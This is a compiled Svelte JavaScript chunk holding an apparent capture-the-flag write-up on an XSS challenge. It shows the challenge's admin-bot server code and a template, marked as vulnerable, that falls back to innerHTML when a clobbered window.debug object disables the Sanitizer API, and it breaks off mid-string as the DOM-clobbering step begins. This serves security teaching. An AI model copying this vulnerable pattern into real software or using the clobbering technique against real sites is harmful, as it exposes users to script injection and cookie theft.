import{S as ln,i as an,s as on,U as qo,y as fl,z as hl,A as ul,V as en,W as Le,g as ml,d as wl,B as Al,X as He,k as t,q as e,a as c,Y as v,l as F,m as r,r as n,h as l,c as i,Z as f,n as h,b as p,D as a,E as nn}from"../chunks/index.725d15e1.js";import{P as pn}from"../chunks/post_layout.1a04af22.js";import{I as ia}from"../chunks/post_card.5135074f.js";function tn(Y){let D,u,k,P,y,w,x,ya,Da,bl,q,J,da,gl,d,Ea,vs,va,fa,fs,ha,ua,hs,ma,wa,us,Aa,ba,_l,ms,Me=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">...</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">app</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">get</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">/report/:sane</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">async</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> res</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">=&gt;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #C792EA">let</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">ctx</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">try</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #EEFFFF">ctx</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> (</span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">browser</span><span style="color: #F07178">)</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">createIncognitoBrowserContext</span><span style="color: #F07178">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #C792EA">const</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">visit</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #C792EA">async</span><span style="color: #F07178"> </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">browser</span><span style="color: #89DDFF">,</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">sane</span><span style="color: #89DDFF">)</span><span style="color: #F07178"> </span><span style="color: #C792EA">=&gt;</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">      </span><span style="color: #C792EA">const</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">page</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">browser</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">newPage</span><span style="color: #F07178">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">      </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">page</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">goto</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">http://localhost:3000</span><span style="color: #89DDFF">"</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">      </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">page</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">setCookie</span><span style="color: #F07178">(</span><span style="color: #89DDFF">&#123;</span><span style="color: #F07178"> name</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">flag</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #F07178"> value</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">process</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">env</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">FLAG</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#125;</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">      </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">page</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">goto</span><span style="color: #F07178">(</span><span style="color: #89DDFF">&#96;</span><span style="color: #C3E88D">http://localhost:3000/</span><span style="color: #89DDFF">$&#123;</span><span style="color: #EEFFFF">sane</span><span style="color: #89DDFF">&#125;&#96;</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">      </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">page</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">waitForNetworkIdle</span><span style="color: #F07178">(</span><span style="color: #89DDFF">&#123;</span><span style="color: #F07178"> timeout</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #F78C6C">5000</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#125;</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">      </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">page</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">close</span><span style="color: #F07178">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">&#125;;</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">...</span></div><div class='line'></div><div class='line'><span style="color: #546E7A">// sanes.ejs file being parsed from the output</span></div><div class='line'><span style="color: #EEFFFF">app</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">get</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">/:sane</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #F07178"> </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">,</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">res</span><span style="color: #89DDFF">)</span><span style="color: #F07178"> </span><span style="color: #C792EA">=&gt;</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #C792EA">const</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">sane</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">sanes</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">get</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">params</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">sane</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">if</span><span style="color: #F07178"> (</span><span style="color: #89DDFF">!</span><span style="color: #EEFFFF">sane</span><span style="color: #F07178">) </span><span style="color: #89DDFF">return</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">res</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">status</span><span style="color: #F07178">(</span><span style="color: #F78C6C">404</span><span style="color: #F07178">)</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">send</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">not found</span><span style="color: #89DDFF">"</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'></div><div class='line'><span style="color: #F07178">  </span><span style="color: #EEFFFF">res</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">render</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">sanes</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">    id</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">params</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">sane</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #F07178">    title</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #82AAFF">encodeURIComponent</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">sane</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">title</span><span style="color: #F07178">)</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #F07178">    body</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #82AAFF">encodeURIComponent</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">sane</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">body</span><span style="color: #F07178">)</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #F07178">  </span><span style="color: #89DDFF">&#125;</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div></code></div></pre>`,ws,K,ga,Cl,As,Re=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" html="true"><div class="language-id">html</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">body</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">h1</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">id</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">title</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #89DDFF">        &lt;</span><span style="color: #F07178">script</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #C792EA">const</span><span style="color: #EEFFFF"> sanitizer </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">new</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">Sanitizer</span><span style="color: #EEFFFF">()</span><span style="color: #89DDFF">;</span><span style="color: #EEFFFF">   </span><span style="color: #89DDFF">&lt;!--</span><span style="color: #EEFFFF"> This is whee the sanitizer API is being installed </span><span style="color: #89DDFF">--&gt;</span></div><div class='line'><span style="color: #EEFFFF">            document</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">getElementById</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">title</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF">)</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">setHTML</span><span style="color: #EEFFFF">(</span><span style="color: #82AAFF">decodeURIComponent</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">&#96;</span><span style="color: #C3E88D">&lt;%- title %&gt;</span><span style="color: #89DDFF">&#96;</span><span style="color: #EEFFFF">)</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span><span style="color: #EEFFFF"> sanitizer </span><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">script</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">h1</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">div</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">id</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">paste</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #89DDFF">        &lt;</span><span style="color: #F07178">script</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #C792EA">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Debug</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">                </span><span style="color: #F07178">#sanitize</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">                </span><span style="color: #C792EA">constructor</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">sanitize </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #FF9CAC">true</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">                    </span><span style="color: #89DDFF">this.</span><span style="color: #EEFFFF">#sanitize</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">sanitize</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">                </span><span style="color: #C792EA">get</span><span style="color: #EEFFFF"> </span><span style="color: #F07178">sanitize</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">                    </span><span style="color: #89DDFF">return</span><span style="color: #F07178"> </span><span style="color: #89DDFF">this.</span><span style="color: #EEFFFF">#sanitize</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #C792EA">async</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">function</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">loadBody</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #89DDFF">&lt;!</span><span style="color: #F07178"> </span><span style="color: #89DDFF">--</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">VULNERABLE</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">CODE</span><span style="color: #F07178"> </span><span style="color: #89DDFF">--&gt;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #C792EA">let</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">extension</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">null;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #89DDFF">if</span><span style="color: #F07178"> (</span><span style="color: #EEFFFF">window</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">debug</span><span style="color: #89DDFF">?.</span><span style="color: #EEFFFF">extension</span><span style="color: #F07178">) </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">                    </span><span style="color: #C792EA">let</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">res</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #82AAFF">fetch</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">window</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">debug</span><span style="color: #89DDFF">?.</span><span style="color: #EEFFFF">extension</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">toString</span><span style="color: #F07178">())</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                    </span><span style="color: #EEFFFF">extension</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">res</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">json</span><span style="color: #F07178">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #F07178">                </span><span style="color: #C792EA">const</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">debug</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #FFCB6B">Object</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">assign</span><span style="color: #F07178">(</span><span style="color: #89DDFF">new</span><span style="color: #F07178"> </span><span style="color: #82AAFF">Debug</span><span style="color: #F07178">(</span><span style="color: #FF9CAC">true</span><span style="color: #F07178">)</span><span style="color: #89DDFF">,</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">extension</span><span style="color: #F07178"> </span><span style="color: #89DDFF">??</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#123;</span><span style="color: #F07178"> report</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #FF9CAC">true</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#125;</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #89DDFF">&lt;!--</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">VULNERABLE</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">CODE</span><span style="color: #F07178"> </span><span style="color: #89DDFF">--&gt;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #C792EA">let</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">body</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #82AAFF">decodeURIComponent</span><span style="color: #F07178">(</span><span style="color: #89DDFF">&#96;</span><span style="color: #C3E88D">&lt;%- body %&gt;</span><span style="color: #89DDFF">&#96;</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #89DDFF">if</span><span style="color: #F07178"> (</span><span style="color: #EEFFFF">debug</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">report</span><span style="color: #F07178">) </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">                    </span><span style="color: #C792EA">const</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">reportLink</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">document</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">createElement</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">a</span><span style="color: #89DDFF">"</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                    </span><span style="color: #EEFFFF">reportLink</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">innerHTML</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#96;</span><span style="color: #C3E88D">Report &lt;%= id %&gt;</span><span style="color: #89DDFF">&#96;</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                    </span><span style="color: #EEFFFF">reportLink</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">href</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#96;</span><span style="color: #C3E88D">report/&lt;%= id %&gt;</span><span style="color: #89DDFF">&#96;</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                    </span><span style="color: #EEFFFF">reportLink</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">style</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">marginTop</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">1rem</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                    </span><span style="color: #EEFFFF">reportLink</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">style</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">display</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">block</span><span style="color: #89DDFF">"</span></div><div class='line'></div><div class='line'><span style="color: #F07178">                    </span><span style="color: #EEFFFF">document</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">body</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">appendChild</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">reportLink</span><span style="color: #F07178">)</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #F07178">                </span><span style="color: #89DDFF">&lt;!--</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">EXECUTION</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">POINT</span><span style="color: #F07178"> </span><span style="color: #89DDFF">--&gt;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #89DDFF">if</span><span style="color: #F07178"> (</span><span style="color: #EEFFFF">debug</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">sanitize</span><span style="color: #F07178">) </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">                    </span><span style="color: #EEFFFF">document</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">getElementById</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">paste</span><span style="color: #89DDFF">"</span><span style="color: #F07178">)</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">setHTML</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">body</span><span style="color: #89DDFF">,</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#123;</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">sanitizer</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#125;</span><span style="color: #F07178">)</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #89DDFF">&#125;</span><span style="color: #F07178"> </span><span style="color: #89DDFF">else</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">                    </span><span style="color: #EEFFFF">document</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">getElementById</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">paste</span><span style="color: #89DDFF">"</span><span style="color: #F07178">)</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">innerHTML</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">body</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #F07178">            </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #82AAFF">loadBody</span><span style="color: #EEFFFF">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">script</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">div</span><span style="color: #89DDFF">&gt;</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">body</span><span style="color: #89DDFF">&gt;</span></div></code></div></pre>`,bs,O,_a,gs,Ca,ka,kl,_s,We=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #C792EA">let</span><span style="color: #EEFFFF"> extension </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">null;</span></div><div class='line'><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> (window</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">debug</span><span style="color: #89DDFF">?.</span><span style="color: #EEFFFF">extension) </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #C792EA">let</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">res</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #82AAFF">fetch</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">window</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">debug</span><span style="color: #89DDFF">?.</span><span style="color: #EEFFFF">extension</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">toString</span><span style="color: #F07178">())</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #EEFFFF">extension</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">res</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">json</span><span style="color: #F07178">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">const</span><span style="color: #EEFFFF"> debug </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Object</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">assign</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">new</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">Debug</span><span style="color: #EEFFFF">(</span><span style="color: #FF9CAC">true</span><span style="color: #EEFFFF">)</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> extension </span><span style="color: #89DDFF">??</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span><span style="color: #EEFFFF"> </span><span style="color: #F07178">report</span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF"> </span><span style="color: #FF9CAC">true</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF">)</span><span style="color: #89DDFF">;</span></div></code></div></pre>`,Cs,T,Pa,ks,xa,Oa,Pl,I,Ps,Ta,Ia,xs,$a,xl,M,Q,za,Ol,A,ja,Os,Sa,Ba,Ts,La,Ha,Tl,ss,R,Il,$,qa,Is,Ma,Ra,$l,$s,Ne=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #C792EA">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Debug</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #F07178">#sanitize</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">constructor</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">sanitize </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #FF9CAC">true</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">        </span><span style="color: #89DDFF">this.</span><span style="color: #EEFFFF">#sanitize</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">sanitize</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">get</span><span style="color: #EEFFFF"> </span><span style="color: #F07178">sanitize</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">        </span><span style="color: #89DDFF">return</span><span style="color: #F07178"> </span><span style="color: #89DDFF">this.</span><span style="color: #EEFFFF">#sanitize</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div></code></div></pre>`,zs,b,Wa,js,Na,Ua,Ss,Za,Xa,zl,W,ls,Ga,jl,z,Va,Bs,Ya,Ja,Sl,E,Ka,Ls,Qa,so,Hs,lo,ao,qs,oo,eo,Ms,no,po,Bl,Rs,Ue=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" html="true"><div class="language-id">html</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">div</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">id</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">debug</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;&lt;/</span><span style="color: #F07178">div</span><span style="color: #89DDFF">&gt;</span></div></code></div></pre>`,Ws,as,N,Ll,j,to,Ns,Fo,ro,Hl,Us,Ze=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" html="true"><div class="language-id">html</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">div</span><span style="color: 